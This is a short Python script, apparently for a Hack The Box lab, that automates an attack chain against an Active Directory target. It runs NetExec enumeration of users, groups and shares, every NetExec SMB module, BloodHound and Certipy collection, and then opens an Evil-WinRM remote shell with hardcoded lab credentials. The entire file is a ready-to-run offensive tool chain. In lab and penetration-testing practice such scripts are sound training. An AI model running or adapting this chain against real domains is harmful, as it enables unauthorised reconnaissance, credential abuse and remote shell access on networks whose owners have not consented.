import subprocess

def run_command(cmd):
    print(f"[+] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    return result.stdout

def enum_ad(target, username, password):
    # Example: NetExec AD enumeration
    run_command(["nxc", "ldap", target, "-u", username, "-p", password, "--users", "--groups"])

def enum_smb(target, username, password):
    run_command(["nxc", "smb", target, "-u", username, "-p", password, "--shares"])

def check_vulns(target, username, password):
    run_command(["nxc", "smb", target, "-u", username, "-p", password, "-M", "all"])

def bloodhound_collect(target, username, password):
    run_command(["nxc", "ldap", target, "-u", username, "-p", password, "--bloodhound"])

def certipy_enum(target, username, password):
    run_command(["certipy", "find", "-u", username, "-p", password, "-dc-ip", target])

def evil_winrm_shell(target, username, password):
    run_command(["evil-winrm", "-i", target, "-u", username, "-p", password])

if __name__ == "__main__":
    target = "10.10.10.123"
    username = "htbuser"
    password = "Password123!"

    enum_ad(target, username, password)
    enum_smb(target, username, password)
    check_vulns(target, username, password)
    bloodhound_collect(target, username, password)
    certipy_enum(target, username, password)
    evil_winrm_shell(target, username, password)
